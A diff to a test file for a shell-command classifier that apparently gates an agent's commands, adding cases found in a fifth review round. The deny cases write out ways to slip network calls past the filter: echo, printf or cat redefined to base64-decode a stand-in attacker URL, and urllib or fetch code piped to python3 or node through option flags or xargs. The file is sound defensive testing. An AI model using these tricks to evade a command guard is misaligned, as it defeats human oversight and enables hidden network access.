@@ -284,9 +284,49 @@ describe('c8b1ccbf round 4', () => {
     ['a substitution in the path', 'curl -s "http://localhost:3420/api/kanban/$(echo abc)/comments"'],
     ['a substitution in the body', 'curl -s -X POST http://localhost:3420/api/x -d "$(cat /tmp/x.json)"'],
     ['${h:-local}', 'curl -s ${h:-http://localhost:3420}/api/x'],
-    ['cat | python3 x.py (a script operand)', `cat <<'S' | python3 x.py\n${UB}\nS`],
+    ['cat | python3 x.py (judged by the python rule since round 5: no network in it)', `cat <<'S' | python3 x.py\n${UB}\nS`],
     ['shell text piped into python3 - (the python rule: no network in it)', `cat <<'S' | python3 -\n${UB}\nS`],
     ['bash <<< "$(cat x.sh)" (no host)', 'bash <<< "$(cat x.sh)"'],
+  ]
+  it.each(pass)('passes %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: false })
+  })
+})
+
+// didi round 5 (card c8b1ccbf, on 897454ee6): item 1, a line that redefines echo / printf / cat makes
+// a "literal print" substitution run anything; items 2-3, an interpreter reached through a pipe kept
+// its stdin as data when an option took a value (-W ignore, -X utf8, node's -r) or xargs fed the code.
+describe('c8b1ccbf round 5', () => {
+  const UL = 'cat <<E"O"F\nhi\nEOF\n'
+  const B64 = 'aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL3g='
+  const PY = `import urllib.request as u; u.urlopen('${EXT}')`
+  const UB = `curl -s ${EXT}`
+  const deny: Array<[string, string]> = [
+    ['1 echo() override, readable', `echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
+    ['1 echo() override, unreadable', `${UL}echo(){ base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
+    ['1 function printf, readable', `function printf { base64 -d <<< ${B64}; }; curl -s "$(printf %s localhost)"`],
+    ['1 function printf, unreadable', `${UL}function printf { base64 -d <<< ${B64}; }; curl -s "$(printf %s localhost)"`],
+    ['1 cat() + quoted heredoc', `cat(){ base64 -d <<< ${B64}; }; curl -s "$(cat <<'S'\nlocalhost\nS\n)"`],
+    ['1 zsh two-name definition', `echo printf () { base64 -d <<< ${B64}; }; curl -s "$(echo localhost)"`],
+    ['1 override seen inside a substitution', `echo(){ base64 -d <<< ${B64}; }; x=$(curl -s "$(echo localhost)")`],
+    ['1 alias', `alias echo='base64 -d <<< ${B64} #'; curl -s "$(echo localhost)"`],
+    ['1 export -f into a text-only -c body', `echo(){ eval "$(cat)"; }; export -f echo; bash -c echo <<'S'\n${UB}\nS`],
+    ['2 | python3 -W ignore -', `cat <<'S' | python3 -W ignore -\n${PY}\nS`],
+    ['2 | python3 -X utf8 -', `cat <<'S' | python3 -X utf8 -\n${PY}\nS`],
+    ['2 | node -r ./x.js', `cat <<'S' | node -r ./x.js\nfetch('${EXT}')\nS`],
+    ['2 bash -c python3 -W ignore -', `bash -c 'python3 -W ignore -' <<'S'\n${PY}\nS`],
+    ['3 | xargs -0 -I{} python3 -c {}', `cat <<'S' | xargs -0 -I{} python3 -c {}\n${PY}\nS`],
+  ]
+  it.each(deny)('denies %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true })
+  })
+  const pass: Array<[string, string]> = [
+    ['echo of localhost, no definition', 'curl -s "$(echo localhost)/api/x"'],
+    ['printf of 127.0.0.1, no definition', 'curl -s "$(printf %s http://127.0.0.1:3420)/api/x"'],
+    ['quoted cat heredoc of localhost', `curl -s "$(cat <<'S'\nlocalhost\nS\n)/api/x"`],
+    ['a function that is not a printer, local curl', 'f(){ echo hi; }; f; curl -s http://localhost:3420/api/x'],
+    ['python3 -c reading stdin as data (no network in the code)', `cat <<'S' | python3 -c 'import sys; print(sys.stdin.read())'\n${PY}\nS`],
+    ['agent-msg.sh message naming a link', `bash /Users/isti/marveen/scripts/agent-msg.sh dexter marveen - <<'VEGE'\nsee ${EXT} and urllib\nVEGE`],
   ]
   it.each(pass)('passes %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: false })
